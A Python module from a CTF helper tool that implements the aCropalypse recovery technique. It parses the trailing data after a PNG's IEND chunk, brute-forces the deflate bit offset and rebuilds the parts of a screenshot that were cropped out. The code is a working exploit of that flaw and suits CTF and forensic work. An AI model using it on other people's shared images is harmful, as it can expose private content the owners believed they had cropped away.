#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# Author: Vozec
# CTFlagger

# Adapted from https://github.com/Absenti/acropalypse_png
# https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02

import zlib
import sys
from os.path import exists
import os
import io
from PIL import Image
from math import ceil
import numpy as np
import struct


def help():
    config = {
        'type': {'picture': ['.png']},
        'name': 'Acropalypse'
    }
    return config


PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
IEND_CHUNK = b'IEND'


# Function to read a PNG chunk
def read_chunk(file):
    length_bytes = file.read(4)
    if not length_bytes:
        return None
    length = struct.unpack('!I', length_bytes)[0]
    chunk_type = file.read(4)
    data = file.read(length)
    crc = file.read(4)
    return (chunk_type, data, crc)


# Function to remove data after IEND chunk
def remove_data_after_iend(input_file, output_file):
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        signature = f_in.read(len(PNG_MAGIC))
        if signature != PNG_MAGIC:
            return

        f_out.write(signature)
        while True:
            chunk = read_chunk(f_in)
            if not chunk:
                break

            chunk_type, data, crc = chunk
            f_out.write(struct.pack('!I', len(data)))
            f_out.write(chunk_type)
            f_out.write(data)
            f_out.write(crc)
            if chunk_type == IEND_CHUNK:
                break


# Function to parse PNG chunks
def parse_png_chunk(stream):
    size = int.from_bytes(stream.read(4), "big")
    ctype = stream.read(4)
    body = stream.read(size)
    csum = int.from_bytes(stream.read(4), "big")
    assert (zlib.crc32(ctype + body) == csum)
    return ctype, body


# Function to pack PNG chunks
def pack_png_chunk(stream, name, body):
    stream.write(len(body).to_bytes(4, "big"))
    stream.write(name)
    stream.write(body)
    crc = zlib.crc32(body, zlib.crc32(name))
    stream.write(crc.to_bytes(4, "big"))


# Function to extract IDAT chunk
def extract_idat(idat, stream):
    while True:
        ctype, body = parse_png_chunk(stream)
        if ctype == b"IDAT":
            idat += body
        elif ctype == b"IEND":
            break
        else:
            return None
    idat = idat[:-4]
    return idat


# Function to build a bitstream from IDAT chunk
def build_bitstream(idat):
    bitstream = []
    for byte in idat:
        for bit in range(8):
            bitstream.append((byte >> bit) & 1)
    for _ in range(7):
        bitstream.append(0)
    return bitstream


# Function to reconstruct bit-shifted bytestreams
def bitshifted(bitstream):
    byte_offsets = []
    bitstream_np = np.array(bitstream)
    for i in range(8):
        indices = np.arange(i, len(bitstream) - 7, 8).reshape(-1, 1)
        bit_indices = np.arange(8)
        shifted_bits = bitstream_np[indices + bit_indices] << bit_indices
        shifted_bytestream = np.sum(shifted_bits, axis=1).astype(np.uint8)
        byte_offsets.append(shifted_bytestream.tobytes())
    return byte_offsets


# Function to find viable parses
def parses(idat, byte_offsets):
    prefix = b"\x00" + (0x8000).to_bytes(2, "little") + (0x8000 ^ 0xffff).to_bytes(2, "little") + b"X" * 0x8000
    for i in range(len(idat)):
        truncated = byte_offsets[i % 8][i // 8:]
        if truncated[0] & 7 != 0b100:
            continue
        d = zlib.decompressobj(wbits=-15)
        try:
            decompressed = d.decompress(prefix + truncated) + d.flush(zlib.Z_FINISH)
            decompressed = decompressed[0x8000:]
            unused_data = np.frombuffer(d.unused_data, dtype=np.uint8)
            if d.eof and unused_data.size in [0, 1] and (unused_data == 0).all():
                break
        except zlib.error as e:
            pass
    else:
        return None
    return decompressed


# Function to create an image from decompressed data
def create_image(height, width, type_exploit, decompressed):
    ihdr = width.to_bytes(4, "big") + height.to_bytes(4, "big") + (8).to_bytes(1, "big")
    ihdr += (2 if type_exploit == "pixel" else 6).to_bytes(1, "big")
    ihdr += (0).to_bytes(3, "big")  # compression method, filter method, interlace method
    channels = 3 if type_exploit == "pixel" else 4
    if type_exploit == "pixel":
        reconstructed_idat = bytearray((b"\x00" + b"\xff\x00\xff" * width) * height)
    elif type_exploit == "windows":
        reconstructed_idat = bytearray((b"\x00" + b"\xff\x00\xff\xff" * width) * height)
    reconstructed_idat[-len(decompressed):] = decompressed
    for i in range(0, len(reconstructed_idat), width * channels + 1):
        if reconstructed_idat[i] == ord("X"):
            reconstructed_idat[i] = 0
    return zlib.compress(reconstructed_idat), ihdr


def generate_png(height, width, type_exploit, decompressed, save):
    if exists(save):
        os.remove(save)
    with open(save, "wb") as out:
        PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
        out.write(PNG_MAGIC)
        idat_compressed, ihdr = create_image(height, width, type_exploit, decompressed)
        pack_png_chunk(out, b"IHDR", ihdr)
        pack_png_chunk(out, b"IDAT", idat_compressed)
        pack_png_chunk(out, b"IEND", b"")
    out.close()
    return Image.open(save)


# Function to find final image dimensions
def find_final_width(height, width, type_exploit, decompressed, save):
    valid_width = width
    valid_height = 0
    width_increment = 1
    while True:
        try:
            generate_png(height, valid_width, type_exploit, decompressed, save).load()
            break
        except:
            valid_width += width_increment

    for i in range(valid_width, valid_width + 5):
        try:
            valid_height = find_final_height(i, type_exploit, decompressed)
            generate_png(valid_height, i, type_exploit, decompressed, save).load()
            valid_width = i
        except:
            continue

    return valid_width


def find_final_height(wid, type_exploit, decompressed):
    # (4Width +1) * Height >= len(decompressed)
    if type_exploit == "windows": return ceil(len(decompressed) / (wid * 4 + 1))
    if type_exploit == "pixel": return ceil(len(decompressed) / (wid * 3 + 1))


def detect(input_file):
    with open(input_file, "rb") as f_in:
        assert (f_in.read(len(PNG_MAGIC)) == PNG_MAGIC)
        while True:
            ctype, body = parse_png_chunk(f_in)
            if ctype == b"IEND":
                break
        trailer = f_in.read()
    try:
        next_idat = trailer.index(b"IDAT", 12)
        idat = trailer[12:next_idat - 8]
        stream = io.BytesIO(trailer[next_idat - 4:])
        return idat, stream
    except ValueError:
        return None, None


def restore(img, save, type_exploit):
    cropped_img = Image.open(img)
    idat, stream = detect(img)
    idat = extract_idat(idat, stream)
    bitstream = build_bitstream(idat)
    bitshifted_bytestream = bitshifted(bitstream)
    decompressed = parses(idat, bitshifted_bytestream)

    width, _ = cropped_img.size
    height = ceil(len(decompressed) ** 0.5)

    # print(height, width, type_exploit, save)

    valid_width = find_final_width(height, width, type_exploit, decompressed, save)
    valid_height = find_final_height(valid_width, type_exploit, decompressed)

    # print(valid_height,valid_width)

    return generate_png(valid_height, valid_width, type_exploit, decompressed, save)


def scan(config):
    config_current = help()

    idat, stream = detect(config['path'])
    if idat is None or stream is None:
        return {"type": "file", "path": "", "content": ""}

    path1 = '%s/acropalypse_restored.png' % config['env_dir']
    img = restore(
        img=config['path'],
        type_exploit="windows",
        save=path1
    )
    img.save(path1)
    path2 = '/%s/%s' % (config['hash'], path1.split('/')[-1])
    return {"type": "file", "path": path2, "content": "Module adapted from 'github.com/Absenti' repository"}
